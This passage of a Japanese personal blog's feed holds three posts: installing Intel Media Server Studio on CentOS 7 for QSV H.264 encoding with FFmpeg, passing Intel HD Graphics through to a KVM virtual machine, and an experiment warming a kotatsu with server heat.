IMSSはIntel Developer Zoneのメンバーになってから、<a href="https://software.intel.com/en-us/intel-media-server-studio">こちら</a>へアクセスすることでダウンロードできます。
メンバー登録時と同じメールアドレスを指定するとダウンロードリンクが送られてくるので、アクセスしてfor Linuxの方をダウンロードします。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/30/IMSS-download.png" alt="IMSS donwload page" /></p>

<p>執筆時点での最新版は2015 R3です。この2015 R3を対象にインストールを進めていきます。(12月中旬に2015 R2を対象にした記事を書き終わっていたのだけれど、公開し損ねてる間にバージョンアップがあったため最初から書き直してるなんて言えない。。)</p>

<p>IMSS 2015 R3から対応OSはCentOSとSLESの2種類のみとなったので、どちらか好きな方を選んでインストールしてください。以下にはCentOS 7での様子を載せます。</p>

<h2>Intel Media SDK Install</h2>

<p>IMSSをダウンロードし回答すると、下図のように幾つかアーカイブの入ったディレクトリが展開されます。そこにあるSDKをインストールすることでQSVを利用することができるようになります。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/30/IMSS-step-1.png" alt="IMSS step 1" /></p>

<p>このSDKのアーカイブを展開すると下図のように、インストール手順の書かれたPDFファイルとOSごとにディレクトリで分けられたドライバがでてきます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/30/IMSS-step-2.png" alt="IMSS step 2" /></p>

<p>今回はCentOS 7なので、CentOSディレクトリに移動し、PDFに記載のインストール手順を踏むだけでいいはずなんですが、幾つか依存関係にあるパッケージが必要になります。これがなくてインストールコケまくったので下表にまとめておきます。<code>yum install</code>などでインストールしてください。</p>

<table>
<thead>
<tr>
<th style="text-align:center;">パッケージ名 </th>
<th style="text-align:left;"> 簡易説明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;">mesa-dri-drivers </td>
<td style="text-align:left;"> グラフィックデバイスドライバ</td>
</tr>
<tr>
<td style="text-align:center;">redhat-lsb </td>
<td style="text-align:left;"> lsb_releaseでOS情報取得したいらしい</td>
</tr>
<tr>
<td style="text-align:center;">wget </td>
<td style="text-align:left;"> あのダウンロードするやつ</td>
</tr>
<tr>
<td style="text-align:center;">net-tools </td>
<td style="text-align:left;"> ネットワーク設定するアレ</td>
</tr>
</tbody>
</table>


<p>そしてあとは手順通りにインストールすればいいだけ。だと思ってたんですが、そのままインストールすると、ファイルやディレクトリが足りない（？）というエラーで怒られてしまいます。
見た感じインストールスクリプトのバグのようですが、一般環境向けのGeneric SDKが用意されているので、これを先にインストールしてからOS SpecificなSDKで上書きすることで、正常にインストールすることができるようです。</p>

<p>なので、SDKのディレクトリにあるGenericディレクトリに移動し、ぽつりと存在するアーカイブを展開します。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/30/IMSS-step-3.png" alt="IMSS step 3" /></p>

<p>展開されたファイルの中にあるシェルスクリプトを管理者権限で実行し、Generic SDKをインストールします。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/30/IMSS-step-4.png" alt="IMSS step 4" /></p>

<p>この作業で必要なディレクトリとファイルが作成されるので、次にOS固有のドライバとSDKをインストールします。</p>

<p>SDKのディレクトリに戻り、さらにCentOSのディレクトリに移動しファイルを確認すると、以下のようになっているはずです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/30/IMSS-step-5.png" alt="IMSS step 5" /></p>

<p>　
ここではファイルの展開等は行わず、PDF記載の通りにユーザーをvideoグループに追加して、<code>/MSS</code>ディレクトリを作成してそこにファイルをコピーしてカレントディレクトリも移動し、インストール関連ファイルの入ったアーカイブを展開してでてくるSDKのインストールスクリプトを実行します。下図のninnikuはカレントユーザー名なので適当に<code>$(whoami)</code>に置換してください。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/30/IMSS-step-6.png" alt="IMSS step 6" /></p>

<p>SDKのインストールが成功すると、下図のようになり、再起動を促されるのでひとまず再起動します。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/30/IMSS-step-7.png" alt="IMSS step 7" /></p>

<p>再起動後、再度<code>/MSS</code>へ移動して、下図のようにドライバの組み込まれたカーネルをビルドします。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/30/IMSS-step-8.png" alt="IMSS step 8" /></p>

<p>正常に終了すると以下のようになります。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/30/IMSS-step-9.png" alt="IMSS step 9" /></p>

<p>指定された場所<code>./rpmbuild/RPMS/</code>に移動すると<code>x86_64</code>ディレクトリがさらにあるのでそこに移動し、ここにあるQSVドライバが組み込まれたカーネルカーネルをインストールします。しかし今回使用しているCentOS 7では、QSVドライバが組み込まれたカーネルより新しいカーネルがインストールされていたため、QSVドライバ付きカーネルのインストールを拒否されてしまいました。
古いバージョンであることを重々承知した上でインストールするため、<code>--oldpackage</code>オプションを追加してインストールし、再起動してドライバのインストールは終了です。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/30/IMSS-step-10.png" alt="IMSS step 10" /></p>

<p>再起動後、<code>lsmod | grep i915</code>として、以下のように幾つか該当があれば、ドライバが動作していることを確認できます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/30/IMSS-step-11.png" alt="IMSS step 11" /></p>

<p>これで終わりかと思いきや、インストールスクリプトのバグなのか、ライブラリのリンク先が間違っており、実際にSDKを利用するときにリンクできずにプログラムが起動しない、などが発生してしまいます。</p>

<p>なので、下記スクリプトを実行してライブラリのパスを再設定してください。</p>

<p><code>sudo bash -c '(ldconfig -p -N | grep intel.mediasdk) || echo "/opt/intel/mediasdk/lib64" &gt;&gt; /etc/ld.so.conf.d/intel-mediasdk.conf &amp;&amp; ldconfig'</code></p>

<h1>H264_QSV codec for FFmpeg</h1>

<p>さて、IMSSのインストールができたのでSDKを利用する代表的なプログラムとして、QSVによるH.264エンコードをしましょう。</p>

<p>前回の記事で紹介した<a href="https://github.com/shenhailuanma/qsv-ffmpeg-codec">qsv_ffmpeg_codec</a>はIntel Media SDKの対応バージョンが古く、導入に手間がかかるのでIMSS 2014 R3対応版としてフォークしました。下記リポジトリに置いてあります。</p>

<p><em><a href="https://github.com/mzyy94/qsv_h264-ffmpeg">mzyy94/h264_qsv-ffmpeg</a></em></p>

<p>ここからクローンし、ディレクトリ下にある<code>./setup.sh</code>を実行して、FFmpeg-2.2ディレクトリに移動して<code>make</code>して、インストールください。</p>

<p>このコーデック、QSVによるH.264へのエンコードはしっかりとできるのですが、<strong>MPEG-TSファイルのエンコードはエラーになります</strong>。原因は、TSの仕組みゆえの、ライブラリの関数<code>MFXVideoENCODE_EncodeFrameAsync</code>に渡される引数によるものというところまではわかったのですが、修正にはほぼ全ての処理を書き換えないといけない手間がかかるので、MPEG-TSから一度RAWファイルを抽出し、パイプ等を使ってQSVコーデックに渡してエンコードしてください。</p>

<p>実行方法の例としては、
<code>ffmpeg -i in.avi -acodec copy -vcodec h264_qsv -b:v 2000k -y -sar 16:9 -s 1280x720 -r 30000/1001 -bufsize 20000k -maxrate 25000k out.mp4</code>
のようにHDサイズにリサイズして変換することができます。</p>

<p>せっかくなのでベンチマークとして、<a href="http://www.bigbuckbunny.org">Big Buck Bunny</a>をエンコードしようと思ったのですが、残念ながら執筆中にダウンロードが終わらなかったのでまたの機会に追記する形で公開しようと思います。</p>

<h1>まとめ</h1>

<p>LinuxでもQSVできる。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[KVMでQSVするためIntel HD Graphicsパススルーするー]]></title>
    <link href="http://mzyy94.com/blog/2014/12/12/kvm-intel-hd-graphics-passthrough/"/>
    <updated>2014-12-12T23:59:49+09:00</updated>
    <id>http://mzyy94.com/blog/2014/12/12/kvm-intel-hd-graphics-passthrough</id>
    <content type="html"><![CDATA[<p>この記事は<a href="http://qiita.com/advent-calendar/2014/linux">Linux Advent Calendar 2014</a> 12日目の記事です。</p>

<p>12月も中頃となり寒い日が続きますね。みなさん体調はいかがでしょうか。</p>

<p>先日の<a href="http://mzyy94.com/blog/2014/12/10/kotatsu-heating/">こたつを温める実験</a>で十分な熱を得られることを知ってしまい、つい調子に乗って動画のエンコードをこたつの中でやってしまって、40℃超の高温になるという経験を得るなど、新しい発見のある毎日です。</p>

<p>こたつ温め実験で使った録画サーバーはCPUがIntel Celeron 847はとても貧弱で、動画をH.264にエンコードしようものなら30分のアニメで8時間かかってしまうほどです。
なんとか短時間で動画エンコードできないかと悩んでいたところ、Intel QuickSync Video(以下QSV、詳細は後述)がLinuxもサポートされていることを思い出し、LinuxでQSVエンコードをしてみようと思い立ちました。</p>

<p>QSVを利用できるベアメタルマシンは我が家に2台あり、より新しいものはCPUにXeon E3v3を搭載しています。
このマシンではKVMで仮想マシンを複数立ち上げていて、カーネルコンパイルなどのCIを回したり、クロスコンパイル環境を構築しているものです。
今回はそのマシンに録画用仮想マシンを立て、録画に必要なUSBデバイスとPCI ExpressのレーンとQSVエンコードのためにIntel HD Graphicsのパススルーを試みる記録の第1章となります。</p>

<!-- more -->


<h1>Intel QuickSync Video</h1>

<p><a href="http://www.intel.co.jp/content/www/jp/ja/architecture-and-technology/quick-sync-video/quick-sync-video-general.html">IntelのQSV公式サイト</a>に情報が載っていますが簡単にまとめます。</p>

<p>Intel Quick Sync Videoとは、Sandy Bridge世代のCore iシリーズのIntel CPUに搭載されているIntel HD Graphicsによる、動画のハードウェアエンコード・デコード技術のことです。
対象となるコーデックはH.264とH.262のみですが、エンコードに関してはソフトウェアで行うものよりもQSVを利用したものの方が圧倒的に高速（ただし品質は低下する模様）です。</p>

<p>QSVをオープンソースな動画エンコードソフトウェアで利用する動きは近頃活発であり、有名どころとしては<a href="https://handbrake.fr">Handbrake</a>が最新版である<a href="https://handbrake.fr/news.php?article=27">バージョン0.10.0でQSVエンコードをサポート</a>し始めました。
<a href="http://www.videolan.org">VLC</a>も<a href="http://www.videolan.org/vlc/releases/2.1.0.html">バージョン2.10からQSVエンコードをサポート</a>しています。</p>

<p>ただ、これらのオープンソースソフトウェア(OSS)によって、QSVによるH.264エンコード高速化の恩恵を受けられるのは、両者ともいまのところWindows版のみとなっています。</p>

<h1>QSV on Linux</h1>

<p>Windows向けにしかOSSのQSVエンコーダーがないからって、なにもLinuxでQSVでエンコードできないわけではないのです。
ffmpegのエンコードコーデックとして、LinuxでもQSVエンコードができる<a href="https://github.com/shenhailuanma/qsv-ffmpeg-codec">qsv-ffmpeg-codec</a>なるものがあるのです。
これを利用するには、Intel Media SDKを導入する必要がありますが、これによってOSSでのQSVエンコードがLinuxでもできるのです。</p>

<h1>Intel Media SDK</h1>

<p>Intel HD GraphicsをLinuxで利用するためにはSDKが必要となります。そのSDKがこれ、Intel Media SDKです。これは現在、<a href="https://software.intel.com/en-us/intel-media-server-studio">Intel(r) Medoa Server Studio 2015</a>(以下IMSS)に含まれる形で提供されています。IMSS 2015 R2ではUbuntuとSUSE Linuxがサポートされています。</p>

<h1>Intel HD Graphics pass-through</h1>

<p>いろいろなシステムの説明を終えたのでここからが本題です。
KVMでIntel HD Graphicsをpass-throughする方法を手順を追って説明していきます。</p>

<p>仮想マシンでのPCIデバイスのパススルーはよく行われており、XenにおいてはGPUパススルーによって<a href="http://www.slideshare.net/zgock/203o">家庭内VDIサーバーを作る</a>というような例があります。</p>

<iframe src="http://www.slideshare.net/slideshow/embed_code/25982988" width="427" height="356" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p> <div style="margin-bottom:5px"> <strong> <a href="https://www.slideshare.net/zgock/203o" title="Xenとzfsで作る家庭内VDIサーバ" target="_blank">Xenとzfsで作る家庭内VDIサーバ</a> </strong> from <strong><a href="http://www.slideshare.net/zgock" target="_blank">zgock</a></strong> </div></p>

<p>XenによるPCIパススルーの記事はたくさん見つかるものの、KVMによるPCIパススルーに関するものは少なく、ましてやCPU内臓GPUのパススルーは皆無と言ってもいいほどです。
これは、KVMにおいてPCIパススルーをするにはIntel VT-dテクノロジーが必要なので、ユーザーが限られてしまうのも影響しているかもしれません。</p>

<p>KVMでPCIパススルーするための手がかりを<code>make menuconfig</code>で調べたところ、次の2つのオプションを有効化することでIntel HD GraphicsをKVMにパススルーできそうだということがわかりました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2014/12/12/Intel-IOMMU-option.png" alt="Intel IOMMU" />
<img src="http://mzyy94.com/blog/resources/images/2014/12/12/VFIO-option.png" alt="Intel VFIO" /></p>

<p>Intel IOMMUはIntel VT-dの機能をカーネルで有効にするものです。
また、VFIOはIOMMUによるデバイスへのアクセスを提供するものです。</p>

<p>これらを有効にしてコンパイル &amp;&amp; インストールしカーネルをKVMでPCIデバイスパススルーできるようにします。</p>

<p>その次はqemuの起動オプションです。
まず、ベアメタルマシン上ではどのようにIntel HD Graphicsが認識されているのかを調べます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2014/12/12/Intel-HD-Graphics-Host.png" alt="Intel HD Graphics host" /></p>

<p>バス00:02.0にIntel HD Graphicsが認識されています。</p>

<p>このバス 00:02.0をPCIデバイスとしてパススルーするため、kvmの起動オプションに<code>-device vfio-pci,host=00:02.0,id=hostpci0,bus=ich9-pcie-port-1,addr=0x0,x-vga=on -machine type=q35</code>を追加します。</p>

<p><strong> !&#8211; 追記(2015/1/30) &#8211; </strong></p>

<p>このとき、CPUタイプのオプションを<code>-cpu Haswell,kvm=off,+x2apic</code>とすることを忘れないでください。</p>

<p><strong> !&#8211; 追記ここまで &#8211; </strong></p>

<p>すると、ゲストLinuxにしっかりとIntel HD Graphicsが渡されていることがわかります。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2014/12/12/Intel-HD-Graphics-Guest.png" alt="Intel HD Graphics guest" /></p>

<h1>Intel Media SDK Install</h1>

<p>この先の記事が長くなってしまったのでIMSSのインストール以降は後ほど別記事に書きます。。</p>

<h1>まとめ</h1>

<p>KVMでもPCIパススルーして幸せになろう！</p>

<p>明日はmasami256さんです。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[サーバーの発熱でこたつを温める]]></title>
    <link href="http://mzyy94.com/blog/2014/12/10/kotatsu-heating/"/>
    <updated>2014-12-10T00:02:35+09:00</updated>
    <id>http://mzyy94.com/blog/2014/12/10/kotatsu-heating</id>
    <content type="html"><![CDATA[<p>この記事は<a href="http://www.adventar.org/calendars/443">coins Advent Calendar</a>の一部です。</p>

<p>寒い日が続きますね。昨夜の外気温は摂氏2度でした。みなさんいかがお過ごしでしょうか。</p>

<p>我が家は先月下旬にこたつを出しました。こたつから出られない生活が続いております。
故に、こんなスライドをLTで発表しました。</p>

<p><a href="http://www.slideshare.net/mzyy94/kotatsu">こたつ - coinsLT #1</a></p>

<iframe src="http://www.slideshare.net/slideshow/embed_code/42258069" width="427" height="356" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p> <div style="margin-bottom:5px"> <strong> <a href="https://www.slideshare.net/mzyy94/kotatsu" title="こたつ - coinsLT #1" target="_blank">こたつ - coinsLT #1</a> </strong> from <strong><a href="http://www.slideshare.net/mzyy94" target="_blank">Yuki Mizuno</a></strong> </div></p>

<p>ITによってこたつ生活のQoLが向上したのですが、まだ改善の余地はあります。
そう、<strong>熱源の有効利用</strong>です。</p>

<p>みなさんご存知の通り、PC機器は熱を持ちます。この熱、せっかくなので有効活用したくありませんか？
ということで、実際にサーバー・デスクトップPCを熱源にしてこたつを温めてみる実験をしてみました。</p>

<!-- more -->


<h1>どのように熱源として活用するか</h1>

<p>冒頭に掲載したスライドにあるように、すでにすべてのサーバーはLANケーブルと電源さえあれば動作し利用できるようになっています。
なので、我が家では電源とLANをこたつまで引っ張り、設置場所をこたつのなかに変えるだけで熱源として利用することができます。</p>

<p><strong>※熱を持つマシンは火災の危険があり、その危険度はアパートを燃やしてVPSを借りるという炎上マーケティングに利用されるほどです。真似する際は十分に注意してください。</strong></p>

<h1>実験環境</h1>

<table>
<thead>
<tr>
<th style="text-align:center;">        日時      </th>
<th style="text-align:center;">             場所           </th>
<th style="text-align:center;"> 外気温 </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;">2014/12/9 19:04:22</td>
<td style="text-align:center;">学園都市内のマンションの一室</td>
<td style="text-align:center;">  2  ℃  </td>
</tr>
</tbody>
</table>


<p>LTで発表した2つのシステムをこたつ内で動作させて、熱の有効利用ができるかどうかを検証してみます。</p>

<h1>録画サーバー</h1>

<p><img src="http://mzyy94.com/blog/resources/images/2014/12/10/recording-server.jpg" alt="Recording Server" /></p>

<p>まずは録画サーバーを熱源としてこたつを温めてみたいと思います。
主な熱源となりうるパーツは以下の通りです。</p>

<table>
<thead>
<tr>
<th style="text-align:center;">パーツ</th>
<th style="text-align:center;">種類</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;"> CPU  </td>
<td style="text-align:center;"> Intel Celeron 847 </td>
</tr>
<tr>
<td style="text-align:center;"> GPU  </td>
<td style="text-align:center;"> n/a </td>
</tr>
<tr>
<td style="text-align:center;"> HDD  </td>
<td style="text-align:center;"> 3x WD Green 3TB </td>
</tr>
<tr>
<td style="text-align:center;"> SSD  </td>
<td style="text-align:center;"> 1x SanDisk 128GB </td>
</tr>
<tr>
<td style="text-align:center;">Power </td>
<td style="text-align:center;"> 200W FlexATX </td>
</tr>
</tbody>
</table>


<p>24時間稼働を前提に構成したサーバーなので低消費電力のパーツが多いですが、HDD3台の発熱は結構なものであると思います。</p>

<h2>実験</h2>

<p>いつもの利用方法を想定して、電源を入れてアニメを2本、計50分ストリーミング再生して温度上昇がどれほどかを実験してみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2014/12/10/recording-server-temperature1.jpg" alt="temperature1" /></p>

<p>電源をいれる直前のこたつ内の温度は16.0℃でした。アニメを再生しているときの録画サーバーの消費電力は平均40.4Wでした。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2014/12/10/recording-server-power.jpg" alt="power1" /></p>

<h2>結果</h2>

<p>体温が熱源となることがないよう、寒いこたつの外でアニメを2本みた後のこたつ内の温度はどうなったでしょうか。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2014/12/10/recording-server-temperature2.jpg" alt="temperature2" /></p>

<p>1時間の録画サーバーの稼働でなんとこたつ内の温度は21.2℃になりました。5.2℃の上昇です。
なんとなく温もりを感じられますが、まだまだこたつとしては物足りなさを感じてしまう温度です。</p>

<h1>ゲームストリームサーバー</h1>

<p><img src="http://mzyy94.com/blog/resources/images/2014/12/10/gamestream-server.jpg" alt="GameStream Server" />
そこで、ゲームストリームサーバーを追加してあらたな熱源としてこたつを温めてみたいと思います。
主な熱源となりうるパーツは以下の通りです。</p>

<table>
<thead>
<tr>
<th style="text-align:center;">パーツ</th>
<th style="text-align:center;">種類</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;"> CPU  </td>
<td style="text-align:center;"> Intel Core i5-2405S </td>
</tr>
<tr>
<td style="text-align:center;"> GPU  </td>
<td style="text-align:center;"> ZOTAC GeForce 750Ti</td>
</tr>
<tr>
<td style="text-align:center;"> HDD  </td>
<td style="text-align:center;"> n/a</td>
</tr>
<tr>
<td style="text-align:center;"> SSD  </td>
<td style="text-align:center;"> 1x Transcend 128GB </td>
</tr>
<tr>
<td style="text-align:center;">Power </td>
<td style="text-align:center;"> 200W FlexATX </td>
</tr>
</tbody>
</table>


<p>ゲーミングマシンとあって、発熱の多いGPUを搭載しているのが特長です。</p>

<h2>実験</h2>

<p>先ほどの録画サーバーによって温まったこたつに、ゲームストリームサーバーを追加して、2台のマシンでどれほどこたつを温められるかを実験してみます。
こちらもいつもの利用方法を想定して、電源を入れてゲームを1チャプター、約30分プレイしてこたつ内を温めます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2014/12/10/gamestream-server-temperature1.jpg" alt="temperature1" /></p>

<p>電源をいれる直前のこたつ内の温度は20.8℃でした。アニメを再生した直後より少し下がっていますが、これはこたつ内にサーバーを搬入した際に、こたつ外の冷えた空気が入ったためです。
ゲームをプレイしているときの2台のマシンの消費電力は平均120Wでした。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2014/12/10/gamestream-server-power.jpg" alt="power2" /></p>

<h2>結果</h2>

<p>1回死んでしまいましたが、なんとかチャプターをクリアできました。透明なハンターは強い。
さて、こたつ内の温度はどうなったでしょうか。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2014/12/10/gamestream-server-temperature2.jpg" alt="temperature2" /></p>

<p>30分間のゲームプレイで、温度はなんと26.1℃になりました。2台のマシンで16.0℃から26.1℃にまで暖かくなりました。10℃も！！
こたつに入ってみると、眠りを誘う温もりを感じられるほどでした。普通にあったかい。</p>

<h1>まとめ</h1>

<p>いくらサーバーの発熱がすごいからと、室温を劇的に上げることはできませんが、こたつの中なら10℃ほど温められることがわかりました。寒い冬にはもってこいのお得情報です。
しかし、こたつの中は埃が多く、炎上してVPSを借りる羽目になることもあるので、くれぐれも真似する際は十分に注意をはらって行ってください。</p>

<p>明日のcoins Advent Calendarは<a href="https://twitter.com/azuma962">カブさん</a>です。</p>
]]></content>
  </entry>
  
</feed>
